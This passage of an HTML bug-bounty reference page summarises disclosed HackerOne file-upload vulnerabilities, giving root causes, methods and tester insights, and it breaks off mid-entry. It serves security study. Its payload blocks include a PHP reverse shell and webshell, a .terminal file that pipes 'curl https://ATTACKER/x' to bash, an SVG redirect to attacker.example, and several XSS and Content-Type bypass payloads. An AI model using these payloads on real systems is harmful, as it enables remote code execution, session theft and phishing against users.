+<p class="insight"><b>Insight —</b> Two weak bugs chain into one strong one: a size/validation bypass that on its own is only DoS becomes a memory-corruption delivery vector once it lets a malicious payload reach an outdated native image library. Always fingerprint the image library version and pair it with any input-size bypass.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/214449" target="_blank" rel="noopener">hackerone.com/reports/214449</a></span><a class="src" href="#report-214449" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-768322" style="--sv:var(--sev-med)" data-sev="2" data-votes="113" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Whitelist-managed upload extensions -&gt; add PHP -&gt; webshell RCE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#768322</b> · concretecms · none · 113 votes · resolved</div>
+<div class="taxo"><span>Program <b>concretecms</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Concrete CMS lets an admin extend the allowed upload file-type list; adding php then uploading a PHP file via File Manager yields a directly-executable webshell/reverse shell.</p>
+<h4>Method</h4><ol><li>As an admin-capable user, open Allow File Types and add 'php'</li><li>Upload a PHP reverse-shell via File Manager</li><li>Start a netcat listener</li><li>Browse to the uploaded file URL to trigger the reverse shell</li></ol>
+<div class="pre">msfvenom -p php/reverse_php LHOST=ATTACKER LPORT=1234 &gt; shell.php
+# upload shell.php, then: nc -nlvp 1234, then visit the file URL</div>
+<p class="insight"><b>Insight —</b> Post-auth 'manage allowed extensions' features are a real RCE path in CMSes - if any role can edit the upload whitelist and the upload dir is web-executable, it is game over. Check whether uploaded files land under the web root and are served with script handlers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/768322" target="_blank" rel="noopener">hackerone.com/reports/768322</a></span><a class="src" href="#report-768322" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-880099" style="--sv:var(--sev-med)" data-sev="2" data-votes="88" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via SVG upload served as image/svg+xml</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#880099</b> · gitlab · awarded · 88 votes · resolved</div>
+<div class="taxo"><span>Program <b>gitlab</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An SVG file containing an onload handler is uploaded (even with a .png name); the server stores/serves it with a content type that renders SVG, so opening the attachment URL executes the embedded script in the site origin.</p>
+<h4>Method</h4><ol><li>Craft an SVG whose root element has onload=alert(1)</li><li>Upload it as an attachment (wiki page/uploads), even naming it .png</li><li>Open the direct uploads/ URL of the file; the SVG renders and JS runs</li></ol>
+<div class="pre">&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"&gt;
+&lt;svg onload="alert(document.domain)" xmlns="http://www.w3.org/2000/svg"&gt;&lt;polygon points="0,0 0,50 50,0"/&gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> SVG is an HTML-executing image format. Any upload feature that serves user files from the app origin with an SVG content type is a stored-XSS vector — test SVG (with onload / &lt;script&gt;) against avatars, attachments, wiki uploads. Extension checks (.png) often don't stop it if the server sniffs or the viewer route forces rendering.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/880099" target="_blank" rel="noopener">hackerone.com/reports/880099</a></span><a class="src" href="#report-880099" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-996041" style="--sv:var(--sev-med)" data-sev="2" data-votes="65" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reddit SVG upload via Content-Type swap -&gt; corrupted image -&gt; persistent cache-poisoning DoS</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#996041</b> · reddit · 500 · 65 votes · resolved</div>
+<div class="taxo"><span>Program <b>reddit</b></span><span>Surface <b>web</b></span><span>Chain <b>MIME bypass upload -&gt; corrupted media object -&gt; CDN ca</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The upload flow validates MIME only on the initial request; uploading a valid PNG first then swapping Content-Type to image/svg+xml (and the body to malformed SVG/XSS) bypasses restrictions, and the resulting broken media object is cached by the CDN, causing a persistent DoS for every follower's home feed.</p>
+<h4>Method</h4><ol><li>Create a media post; first upload a normal PNG (primes the flow)</li><li>Add another image, intercept the request, change Content-Type image/png -&gt; image/svg+xml and swap the body to SVG</li><li>Post succeeds (201); the corrupted image poisons the cache -&gt; followers' home page fails to load with no way to clear it</li></ol>
+<div class="pre"># Burp: on 2nd upload change header
+Content-Type: image/svg+xml
+# body -&gt; SVG (external-ref rects / &lt;a href=javascript:&gt; / onload=alert) that the pipeline can't render
+&lt;svg xmlns=... &gt;&lt;rect fill="url('http://example.com/x.svg')".../&gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> MIME validation that only inspects the first/priming request is bypassable by swapping Content-Type on a follow-up upload. A malformed-but-accepted media object cached by a CDN turns a file-upload flaw into a persistent, no-interaction DoS across all consumers of that cache key.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/996041" target="_blank" rel="noopener">hackerone.com/reports/996041</a></span><a class="src" href="#report-996041" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1019425" style="--sv:var(--sev-med)" data-sev="2" data-votes="30" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Content-Type validation bypass via malformed multi-value header</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1019425</b> · pixiv · awarded · 30 votes · resolved</div>
+<div class="taxo"><span>Program <b>pixiv</b></span><span>Surface <b>web</b></span><span>Chain <b>Upload filter bypass -&gt; HTML served on sandbox domain -&g</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The header-image upload validated Content-Type but accepted malformed multi-value values like 'text/html; image/png'. Supplying text/html let an HTML+JS file be stored and served as HTML on the sandbox domain s2.booth.pm -&gt; stored XSS.</p>
+<h4>Method</h4><ol><li>Upload a header image, intercept the request</li><li>Set Content-Type to a malformed value containing text/html (e.g. 'text/html; image/png')</li><li>Server accepts it and serves the HTML/JS file -&gt; stored XSS on the sandbox domain</li></ol>
+<div class="pre">Content-Type: text/html; image/png
+
+&lt;html&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/html&gt;</div>
+<p class="insight"><b>Insight —</b> File-upload Content-Type checks that do substring/loose matching can be beaten by malformed multi-value headers that smuggle text/html alongside an allowed type. Always test odd Content-Type combinations, not just single forbidden values.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1019425" target="_blank" rel="noopener">hackerone.com/reports/1019425</a></span><a class="src" href="#report-1019425" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1019389" style="--sv:var(--sev-med)" data-sev="2" data-votes="29" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Missing com.apple.quarantine xattr -&gt; Gatekeeper bypass RCE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1019389</b> · basecamp · awarded · 29 votes · resolved</div>
+<div class="taxo"><span>Program <b>basecamp</b></span><span>Surface <b>desktop</b></span><span>Chain <b>malicious attachment -&gt; missing quarantine -&gt; Gatekeep</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The macOS client writes downloaded message attachments to disk without applying the com.apple.quarantine extended attribute, so Gatekeeper never evaluates them. An auto-executing format (.terminal) delivered as an attachment runs a shell command on open with no unidentified-developer prompt.</p>
+<h4>Method</h4><ol><li>Craft a .terminal file whose CommandString is a reverse-shell one-liner</li><li>Send it as a message attachment via the app</li><li>Victim downloads and opens it in the client</li><li>Command executes with no Gatekeeper warning</li></ol>
+<div class="pre">&lt;plist&gt;&lt;dict&gt;&lt;key&gt;CommandString&lt;/key&gt;&lt;string&gt;curl -Ls https://ATTACKER/x | bash -s HOST PORT&lt;/string&gt;&lt;key&gt;RunCommandAsShell&lt;/key&gt;&lt;false/&gt;&lt;key&gt;name&lt;/key&gt;&lt;string&gt;exploit&lt;/string&gt;&lt;key&gt;type&lt;/key&gt;&lt;string&gt;Window Settings&lt;/string&gt;&lt;/dict&gt;&lt;/plist&gt;</div>
+<p class="insight"><b>Insight —</b> For any desktop app that saves user-supplied downloads, check whether the saved file carries the quarantine xattr (xattr -p com.apple.quarantine file). If absent, Gatekeeper is bypassed and auto-executing formats (.terminal, .command, .app, .webloc) become RCE.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1019389" target="_blank" rel="noopener">hackerone.com/reports/1019389</a></span><a class="src" href="#report-1019389" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-697959" style="--sv:var(--sev-med)" data-sev="2" data-votes="13" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>File-access policy enforced on extension, not MIME type</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#697959</b> · nextcloud · awarded · 13 votes · resolved</div>
+<div class="taxo"><span>Program <b>nextcloud</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A 'file access control' rule intended to block file types by MIME actually only inspects the filename extension, so renaming a forbidden binary (e.g. .exe) to an allowed extension (e.g. .txt) bypasses the upload/download restriction.</p>
+<h4>Method</h4><ol><li>Admin configures a rule blocking a MIME type (e.g. executables)</li><li>Rename the blocked file to an allowed extension</li><li>Upload and later download it; content is unchanged, restriction bypassed</li></ol>
+<div class="pre">copy malware.exe malware.txt   # upload malware.txt, rename/execute after download</div>
+<p class="insight"><b>Insight —</b> When a control claims to filter by MIME/content type, test whether it actually checks only the extension (and vice versa). Extension vs real content-type mismatch is a standard upload-policy bypass.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/697959" target="_blank" rel="noopener">hackerone.com/reports/697959</a></span><a class="src" href="#report-697959" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-259913" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>User-controlled storage slot/filename parameter</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#259913</b> · deptofdefense · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An image-upload feature caps users at 10 logos via a client-supplied slot index (imgnum=1..10) that the server trusts as the storage key, so setting an arbitrary imgnum lets a user write unlimited distinct files with attacker-chosen names/keys.</p>
+<h4>Method</h4><ol><li>Upload a logo normally and capture the POST</li><li>Change the imgnum parameter to an arbitrary value (word or large number)</li><li>Mirror the same value in the retrieval URL to fetch it back</li><li>Repeat to fill storage / bypass the per-user file cap (storage DoS)</li></ol>
+<div class="pre">POST .../upload (multipart) with imgnum=cow   # instead of 1-10
+GET  /scripts/wa.cgi?VL&amp;Y=&lt;acct&gt;&amp;imgnum=cow   # retrieves it</div>
+<p class="insight"><b>Insight —</b> When a limit or object key is enforced by a client-supplied index/slot parameter, fuzz it: arbitrary values often escape count limits and can enable path/key control. Server should allocate keys, not trust the client's imgnum.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/259913" target="_blank" rel="noopener">hackerone.com/reports/259913</a></span><a class="src" href="#report-259913" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-368927" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SVG upload served from trusted path -&gt; stored XSS/redirect</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#368927</b> · rocket_chat · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Uploaded SVG files are accessible under a trusted app path (/file-upload/ID/name.svg) and rendered as active content, so embedded JavaScript executes in the victim's browser (redirect, malware push, or XSS). The upload allowlist blocked html/shtml/php but not svg.</p>
+<h4>Method</h4><ol><li>Upload an SVG containing script to any chat/upload feature.</li><li>Send the victim the /file-upload/ID/name.svg URL on the trusted domain.</li><li>The SVG's JS runs when opened (redirect to phishing, download, or arbitrary script).</li></ol>
+<div class="pre">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;script&gt;window.location='https://attacker.example/phish'&lt;/script&gt;&lt;/svg&gt;</div>
+<p class="insight"><b>Insight —</b> SVG is executable content. If an upload filter blocks html/php but allows svg and serves it inline from the app origin, you have stored XSS (and thus arbitrary redirect). Always test svg upload; remediation is to block svg or serve uploads from an isolated origin with Content-Disposition: attachment.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/368927" target="_blank" rel="noopener">hackerone.com/reports/368927</a></span><a class="src" href="#report-368927" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1350444" style="--sv:var(--sev-med)" data-sev="2" data-votes="10" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Remote-file import writes PHP to guessable uniqid() temp dir for RCE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#1350444</b> · concretecms · none · 10 votes · resolved</div>
+<div class="taxo"><span>Program <b>concretecms</b></span><span>Surface <b>web</b></span><span>Chain <b>remote file import bypass -&gt; transient .php survives via </b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A 'download remote URL' feature writes fetched content (including .php) into a temp dir named by uniqid(), whose first 8 hex chars are the UTC timestamp; the dir is normally deleted in a destructor, but forcing a mid-batch error leaves the file long enough to bruteforce the last 5 hex chars and execute it.</p>
+<h4>Method</h4><ol><li>As admin, use file manager remote import: first URL = your webshell (byc.php), followed by 20+ URLs to a slow /stuck endpoint</li><li>Slow endpoint sleeps 10s each so total processing approaches the 120s limit and errors before VolatileDirectory __destruct cleanup runs</li><li>Webshell .php remains in volatile-0-&lt;uniqid&gt; temp dir</li><li>Derive creation time from first 8 hex chars of the dir name, bruteforce the last 5 hex chars, request the file -&gt; RCE</li></ol>
+<div class="pre"># malicious server serving webshell + slow endpoints
+EXPLOIT="&lt;?php phpinfo();"
+# do_GET: if path=='/stuck': time.sleep(10)
+
+# recover creation time from dir name volatile-0-614daecb71435
+import datetime
+print(datetime.datetime.fromtimestamp(int('0x614daecb',16), tz=datetime.timezone.utc))
+# -&gt; 2021-09-24 10:56:11+00:00 ; bruteforce last 5 hex chars</div>
+<p class="insight"><b>Insight —</b> uniqid() is NOT random: its leading chars encode the timestamp, so any file/dir/token named with uniqid() is bruteforceable once you know roughly when it was created. Also, cleanup destructors can be dodged by making the request error before they run, turning a transient file into a persistent one.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1350444" target="_blank" rel="noopener">hackerone.com/reports/1350444</a></span><a class="src" href="#report-1350444" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-823588" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Upload-restriction bypass by renaming shell to an allowed extension (.txt / image)</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#823588</b> · stripo · none · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>stripo</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The upload control enforces its extension/type check only against a blacklist (or a front-end-only whitelist), so a dangerous file is accepted simply by giving it an allowed extension; the file content is never inspected server-side.</p>
+<h4>Method</h4><ol><li>Attempt to upload the malicious file with its native extension (.php); observe it is blocked -&gt; a filter exists.</li><li>Save/rename the same payload to an allowed extension the form accepts (.txt worked here; also try .jpg/.jpeg, or an image polyglot).</li><li>Re-upload; the file is accepted. Retrieve its URL to check whether it is served/interpreted (impact depends on how the app serves it).</li></ol>
+<div class="pre"># blocked:
+r57.php
+
+# accepted (rename to an allowed extension the form's list permits):
+r57.txt        # allowed-extension rename (worked in triage)
+r57.JPEG       # image disguise variant
+
+# 949295 variant: form allows .csv/.txt/.xls/.xlsx only -&gt; rename payload.html to payload.txt to defeat the front-end whitelist</div>
+<p class="insight"><b>Insight —</b> Never conclude 'upload is restricted' after the native extension is rejected. Enumerate the whole allow-list and re-try the payload under each permitted extension; the check is almost always extension-string-only and never validates real content. If the whitelist is enforced only in the browser, intercept and change the extension in the request. Confirm real impact by checking how/whether the stored file is later served or interpreted before rating it.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/823588" target="_blank" rel="noopener">hackerone.com/reports/823588</a></span><a class="src" href="#report-823588" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-88508" style="--sv:var(--sev-med)" data-sev="2" data-votes="8" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via unescaped caption/subtitle (.vtt) file on legacy Flash player</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#88508</b> · vimeo · awarded · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>vimeo</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Caption/subtitle file content is stored and rendered without escaping by the Flash-based player; the HTML5 player escapes, so the attacker forces the Flash player (via the Hubnut widget) to reach the vulnerable render path.</p>
+<h4>Method</h4><ol><li>Upload a .vtt caption file whose cue text contains HTML/JS</li><li>Enable the caption on the video</li><li>Force the legacy Flash player (e.g. Hubnut widget URL) where captions render unescaped</li><li>Activate CC; payload executes for any viewer</li></ol>
+<div class="pre">&lt;!-- inside English.vtt cue text --&gt;
+&lt;img src=x onerror=alert(document.domain)&gt;</div>
+<p class="insight"><b>Insight —</b> Uploaded media side-files (subtitles .vtt/.srt, metadata, ID3, EXIF) are stored-XSS vectors when a rendering path echoes them unescaped. Different players/renderers of the same asset can differ in sanitization -- find and force the weakest one.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/88508" target="_blank" rel="noopener">hackerone.com/reports/88508</a></span><a class="src" href="#report-88508" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-236607" style="--sv:var(--sev-med)" data-sev="2" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Failed archive import leaves uploaded PHP in web root -&gt; RCE</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#236607</b> · expressionengine · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>expressionengine</b></span><span>Surface <b>web</b></span><span>Chain <b>malicious zip -&gt; extract-before-validate -&gt; orphaned P</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The Import Channel feature extracts a user-supplied .zip into a web-served cache directory before validating that all required files are present; on a deliberately incomplete archive the import errors out but the extracted files (including .php) are never cleaned up, and the directory has listing enabled.</p>
+<h4>Method</h4><ol><li>Upload a channel-set .zip that contains a webshell (test.php) but omits a required import file.</li><li>The import fails with 'file doesn't exist', but the archive was already extracted to /system/user/cache/cset/.</li><li>Browse the directory listing at /system/user/cache/cset/&lt;tmpdir&gt;/ and open test.php?cmd=whoami to execute commands.</li></ol>
+<div class="pre"># test.php inside the zip
+&lt;?php system($_GET['cmd']); ?&gt;
+# then:
+http://HOST/system/user/cache/cset/&lt;tmpdir&gt;/test.php?cmd=whoami</div>
+<p class="insight"><b>Insight —</b> Any 'extract archive, then validate' flow is exploitable if extraction happens before validation and the temp dir is web-reachable. Force the validation to fail so cleanup is skipped, then request the residual file. Always test whether upload temp/cache dirs are under the web root and have directory listing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/236607" target="_blank" rel="noopener">hackerone.com/reports/236607</a></span><a class="src" href="#report-236607" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-789579" style="--sv:var(--sev-med)" data-sev="2" data-votes="5" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Presigned S3 upload: content-length silently unsigned -&gt; arbitrary file size</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#789579</b> · rails · awarded · 5 votes · resolved</div>
+<div class="taxo"><span>Program <b>rails</b></span><span>Surface <b>cloud</b></span><span>Tag <b>cloud-aws</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">ActiveStorage direct-upload asks S3 to presign a PUT constrained by content_length, but the aws-sdk-s3 presigner silently blacklists the content-length header unless whitelist_headers is set, so the size constraint is never actually part of the signed URL and the client can upload any size (CVE-2020-8162).</p>
+<h4>Method</h4><ol><li>Identify a client-side direct-upload flow that presigns to S3 (filename, content_type, byte_size, checksum sent to a DirectUploads controller)</li><li>Request a presigned URL declaring a small byte_size</li><li>Inspect the returned URL: content-length is absent from the signed query params</li><li>PUT a much larger file to the presigned URL; S3 accepts it, bypassing the app's size validation</li></ol>
+<div class="pre"># presigner drops content-length unless whitelisted:
+object.presigned_url(:put, content_type: ct, content_length: n, content_md5: sum)
+# -&gt; URL has NO content-length; fix requires whitelist_headers: ['content-length']</div>
+<p class="insight"><b>Insight —</b> Never assume a presigned-URL constraint (content-length, content-type) is enforced just because you passed it to the SDK - some SDKs silently drop headers that are not explicitly whitelisted. Verify the signed query string actually contains the constraint; if it is missing, client-declared limits are advisory only and can be exceeded.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/789579" target="_blank" rel="noopener">hackerone.com/reports/789579</a></span><a class="src" href="#report-789579" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-17390" style="--sv:var(--sev-med)" data-sev="2" data-votes="1" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SWF uploaded as .jpg, content-type-sniffed as Flash -&gt; cross-origin reads</h3><span class="fieldmark">◆ Medium</span></div>
+<div class="catalog">Specimen <b>#17390</b> · uzbey · none · 1 votes · resolved</div>
+<div class="taxo"><span>Program <b>uzbey</b></span><span>Surface <b>web</b></span><span>Chain <b>file upload (SWF as .jpg) -&gt; content-sniffing cross-origi</b></span><span>Tag <b>cors</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An image-upload feature stores an attacker SWF under a .jpg name on the victim origin; browsers/Flash content-sniff it and execute it in the victim's origin, letting the attacker's page read same-origin responses (pages, CSRF tokens) cross-origin.</p>
+<h4>Method</h4><ol><li>Upload a malicious SWF renamed with an image extension (magic.jpg) to the victim origin's user gallery.</li><li>From an attacker page, iframe a helper page that &lt;embed&gt;s the uploaded SWF from the victim origin.</li><li>The SWF runs with the victim origin and issues authenticated GET requests, returning page source (incl. anti-CSRF tokens) to attacker JS.</li><li>Parse the token and auto-submit a state-changing POST -&gt; site-wide CSRF.</li></ol>
+<div class="pre"># attacker sniff.html embeds the uploaded SWF served from victim origin:
+&lt;embed src="https://staging.victim.com/sites/default/files/magic.jpg" type="application/x-shockwave-flash"&gt;&lt;/embed&gt;
+// SWF: GET https://staging.victim.com/messages/new -&gt; callback nice(sourceHtml) -&gt; extract form_build_id/form_token -&gt; POST</div>
+<p class="insight"><b>Insight —</b> Allowing user files to be served from the app's own origin with sniffable content types breaks the same-origin barrier: an uploaded SWF/HTML that the browser content-sniffs runs as the victim origin. Serve uploads from a sandbox domain, force Content-Type + X-Content-Type-Options: nosniff, and never trust extension-only validation.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/17390" target="_blank" rel="noopener">hackerone.com/reports/17390</a></span><a class="src" href="#report-17390" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-964550" style="--sv:var(--sev-low)" data-sev="1" data-votes="56" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored XSS via image EXIF payload + Content-Type coercion</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#964550</b> · shopify · none · 56 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An avatar/image upload embeds an HTML/script payload in a PNG metadata (tEXt Comment) chunk, and the server stores/serves the file with an attacker-chosen Content-Type (text/html) instead of validating/normalizing it, so the browser renders the 'image' as HTML.</p>
+<h4>Method</h4><ol><li>Write the script into a PNG comment with exiftool</li><li>Upload it via the avatar/image endpoint</li><li>In Burp, change the multipart part's Content-Type from image/png to text/html</li><li>Fetch the stored asset URL from the CDN; the payload executes</li></ol>
+<div class="pre">exiftool -Comment="\"&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;" poc.png
+# then in the upload request:
+Content-Disposition: form-data; name="account[avatar]"; filename="poc.png"
+Content-Type: text/html</div>
+<p class="insight"><b>Insight —</b> When an upload lets you control the stored Content-Type (or the server sniffs to text/html), metadata-embedded HTML becomes stored XSS. Always test flipping the part's MIME to text/html and put the payload in EXIF/tEXt chunks so magic-byte checks still pass.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/964550" target="_blank" rel="noopener">hackerone.com/reports/964550</a></span><a class="src" href="#report-964550" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1606957" style="--sv:var(--sev-low)" data-sev="1" data-votes="33" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Client-side-only filetype check bypass</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1606957</b> · reddit · awarded · 33 votes · resolved</div>
+<div class="taxo"><span>Program <b>reddit</b></span><span>Surface <b>web</b></span><span>Chain <b>Malicious-doc delivery (weaponized office doc) to an interna</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Allowed file types are enforced only by client-side JavaScript on drag-and-drop; the underlying apexremote/uploadFile endpoint performs no server-side type check, so a crafted request uploads any file.</p>
+<h4>Method</h4><ol><li>Observe allowed types (jpg/png/pdf) enforced in JS</li><li>Send the upload request directly (Salesforce Visualforce apexremote uploadFile) with a base64 docx</li><li>200 OK confirms no server-side validation -&gt; deliver malicious doc (e.g. Follina) to the form handler</li></ol>
+<div class="pre">POST /adhelp/apexremote HTTP/1.1
+Host: reddit.secure.force.com
+X-User-Agent: Visualforce-Remoting
+Content-Type: application/json
+
+{"action":"AdvertisingHelpController","method":"uploadFile","data":["&lt;base64 docx&gt;","","Dummy Data.docx",...],"type":"rpc","tid":3,"ctx":{...}}</div>
+<p class="insight"><b>Insight —</b> Whenever upload restrictions look client-side (JS blocks drag-drop), replay the raw multipart/RPC request with a disallowed extension. Salesforce force.com apps expose apexremote uploadFile as the server sink.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1606957" target="_blank" rel="noopener">hackerone.com/reports/1606957</a></span><a class="src" href="#report-1606957" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/file-upload" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-998422" style="--sv:var(--sev-low)" data-sev="1" data-votes="21" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>SVG XSS bypasses image validation via .svg.png double extension (content sniffing)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#998422</b> · nextcloud · none · 21 votes · resolved</div>
